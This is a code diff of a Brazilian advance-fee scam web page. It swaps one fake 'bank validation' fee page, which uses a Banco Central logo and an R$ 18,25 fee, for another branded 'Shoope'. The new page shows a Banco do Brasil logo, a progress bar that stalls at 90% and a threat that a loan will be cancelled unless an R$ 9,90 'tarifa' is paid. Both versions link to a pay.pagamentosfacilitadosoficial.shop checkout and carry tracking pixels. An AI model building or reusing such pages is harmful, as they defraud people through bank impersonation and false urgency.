@@ -1,165 +1,163 @@
 <!DOCTYPE html><html lang="pt-BR"><head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Upsell 5 - Validação Bancária</title>
-   
-    <script>
-        localStorage.setItem("upsell", "up5");
-        </script>
-   
-<script
-  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
-  data-utmify-prevent-xcod-sck
-  data-utmify-prevent-subids
-  async
-  defer
-></script>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Shoope</title>
+  <link rel="preload" href="css/style.css" as="style">
+  <link rel="preload" href="css/slider.css" as="style">
+  <link rel="preload" href="css/animated.css" as="style">
+  <link rel="preload" href="css/notiflix-3.2.5.min.css" as="style">
+  <link rel="stylesheet" href="css/style.css">
+  <link rel="stylesheet" href="css/slider.css">
+  <link rel="stylesheet" href="css/animated.css">
+  <link rel="stylesheet" href="css/notiflix-3.2.5.min.css">
+  <link rel="shortcut icon" href="images/faveicon.png">
+  <script>
+    window.pixelId = "68478c2e2058440e4c5174d0";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+  </script>
+  
+      <script src="js/br.js" defer=""></script>
 
-<script>
-  window.pixelId = "682f4a0b17362a4244bf5d3c";
-  var a = document.createElement("script");
-  a.setAttribute("async", "");
-  a.setAttribute("defer", "");
-  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
-  document.head.appendChild(a);
-</script>
 
-    <style>
-        body {
-            font-family: 'Arial', sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #f8f9fa;
-            color: #333;
-        }
 
-        .header {
-            background-color: #004080;
-            padding: 20px;
-            text-align: center;
-        }
-
-        .header img {
-            max-width: 150px;
-        }
-
-        .container {
-            max-width: 600px;
-            margin: 40px auto;
-            padding: 30px;
-            background: #ffffff;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-            border-radius: 10px;
-            text-align: center;
-        }
-
-        .container h1 {
-            color: #004080;
-            font-size: 26px;
-            margin-bottom: 20px;
-            font-weight: bold;
-        }
-
-        .container p {
-            font-size: 16px;
-            color: #555;
-            line-height: 1.6;
-            margin-bottom: 20px;
-        }
-
-        .highlight {
-            color: #004080;
-            font-weight: bold;
-        }
-
-        .cta {
-            margin-top: 30px;
-        }
-
-        .cta button {
-            background-color: #004080;
-            color: white;
-            padding: 15px 30px;
-            border: none;
-            font-size: 18px;
-            font-weight: bold;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: background-color 0.3s;
-        }
-
-        .cta button:hover {
-            background-color: #0056b3;
-        }
-
-        .footer {
-            margin-top: 30px;
-            font-size: 14px;
-            color: #777;
-        }
-
-        .footer strong {
-            color: #d9534f;
-        }
-
-        .info-box {
-            background-color: #f1f1f1;
-            border-left: 5px solid #004080;
-            padding: 15px;
-            margin: 20px 0;
-            text-align: left;
-            font-size: 15px;
-            color: #333;
-        }
-
-        .info-box h3 {
-            margin: 0;
-            font-size: 16px;
-            font-weight: bold;
-        }
-    </style>
-</head>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f9f9f9;
+      margin: 0;
+      padding: 0;
+      visibility: hidden;
+    }
+    .container {
+      max-width: 500px;
+      margin: 20px auto;
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 15px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+    .alert {
+      font-size: 13px;
+      color: #842029;
+      border: 1px solid #f5c2c7;
+      padding: 10px;
+      background-color: #f8d7da;
+      border-radius: 10px;
+      margin-top: 15px;
+    }
+    .progress-container {
+      width: 100%;
+      background-color: #e0e0e0;
+      border-radius: 5px;
+      overflow: hidden;
+      margin: 20px 0;
+      height: 30px;
+    }
+    .progress-bar {
+      width: 0%;
+      height: 100%;
+      background-color: #fe6233;
+      color: #fff;
+      text-align: center;
+      line-height: 30px;
+      transition: width 0.4s ease;
+      font-weight: bold;
+    }
+    .btn {
+      display: block;
+      background-color: #fe6233;
+      color: white;
+      padding: 15px;
+      border: none;
+      border-radius: 10px;
+      width: 100%;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    .footer-logo {
+      margin-top: 30px;
+    }
+    #preloader {
+      background: #ffffff;
+      position: fixed;
+      z-index: 9999;
+      width: 100%;
+      height: 100%;
+      top: 0;
+      left: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .tarifa-valor {
+      font-size: 16px;
+      font-weight: bold;
+      color: #fe6233;
+      margin-top: 20px;
+    }
+  </style>
+<script src="js/br.js" defer=""></script></head>
 <body>
+  <div id="preloader">
+    <img src="images/unnamed.png" alt="Carregando..." style="width: 50px;">
+  </div>
 
-    <div class="header">
-        <img src="https://s3.typebot.io/public/workspaces/clpwrgv88001vlh0fl3wduaqz/typebots/clsoykmoc0001o1a8fuuy3j8r/blocks/ymggz8eopp0fj524hfxubuit?v=1735166818525" alt="Logo Banco Central">
+  <div class="container">
+    <div class="alert">
+      <strong>ATENÇÃO:</strong><br>
+      Caso o pagamento da tarifa não seja realizado nos próximos minutos, o empréstimo será automaticamente cancelado pelo sistema.
     </div>
-
-    <div class="container">
-        <h1>🔒 Validação Bancária Obrigatória</h1>
-        <p>Para garantir a segurança e regularidade da sua transferência, é necessária a realização de uma <span class="highlight">validação bancária obrigatória</span>, conforme as normas do sistema bancário nacional.</p>
-
-        <div class="info-box">
-            <h3>Por que a validação é necessária?</h3>
-            <p>✔️ Evita transações inválidas ou bloqueios futuros.</p>
-            <p>✔️ Confirma a autenticidade dos seus dados bancários.</p>
-            <p>✔️ Libera sua transferência com total segurança.</p>
-        </div>
-
-        <p><strong>Valor da Taxa:</strong> <span class="highlight">R$ 18,25</span></p>
-        <p><strong>Prazo para Validação:</strong> Até 15 minutos após o pagamento.</p>
-
-        <div class="cta">
-            <button onclick="checkout(event)">VALIDAR AGORA</button>
-        </div>
-
-        <div class="footer">
-            ⚠️ <strong>Atenção:</strong> O não pagamento pode causar o registro de sua conta como <strong>irregular</strong>, impactando futuras transações financeiras.
-        </div>
+    <div class="progress-container">
+      <div id="myProgressBar" class="progress-bar">0%</div>
     </div>
-    <script>
-        function checkout(event) {
-          event.preventDefault();
-      
-          // Captura todos os parâmetros da URL atual
-          const currentParams = window.location.search;
-      
-          // Constrói a URL de destino incluindo os mesmos parâmetros
-          const destino = "https://pay.pagamentosfacilitadosoficial.shop/nWrxGWAxMdw3654" + currentParams;
-      
-          // Redireciona
-          window.location.href = destino;
+    <img src="images/C-pia-de-Inserir-um-t-tulo-1.png" alt="Saque" style="width: 80%; max-width: 400px; margin: 20px auto;">
+    <p style="font-size: 14px;">
+      Para liberação, é necessário realizar o pagamento da tarifa de validação. Após o pagamento, o valor será transferido imediatamente para sua chave PIX.<br><br>
+      <strong>Evite o cancelamento automático e confirme agora.</strong>
+    </p>
+
+    <p class="tarifa-valor">Valor da tarifa: <strong>R$ 9,90</strong></p>
+
+    <a style="max-width:95%;text-decoration: none;" href="https://pay.pagamentosfacilitadosoficial.shop/yOeXZKlKzmxGAQa" class="btn pagamentoBanco do Brasil" id="paymentButton">PAGAR TARIFA E RECEBER</a>
+
+    <div class="footer-logo">
+      <img src="images/channels4_profile.jpg" alt="Banco do Brasil" style="width: 35px;">
+    </div>
+    <p style="font-size: 12px; color: gray; margin-top: 10px;">Shoope, 2025. Todos os direitos reservados.</p>
+  </div>
+
+  <script src="js/notiflix-3.2.5.min.js"></script>
+  <script>
+    function updateProgressBar() {
+      const progressBar = document.getElementById('myProgressBar');
+      let width = 0;
+      const interval = setInterval(() => {
+        if (width >= 90) {
+          clearInterval(interval);
+        } else {
+          width++;
+          progressBar.style.width = width + '%';
+          progressBar.textContent = width + '%';
         }
-      </script>
+      }, 20);
+    }
+
+    window.onload = function () {
+      document.getElementById('preloader').style.display = 'none';
+      document.body.style.visibility = 'visible';
+      updateProgressBar();
+    };
+
+  
+  </script>
+
 
 </body></html>
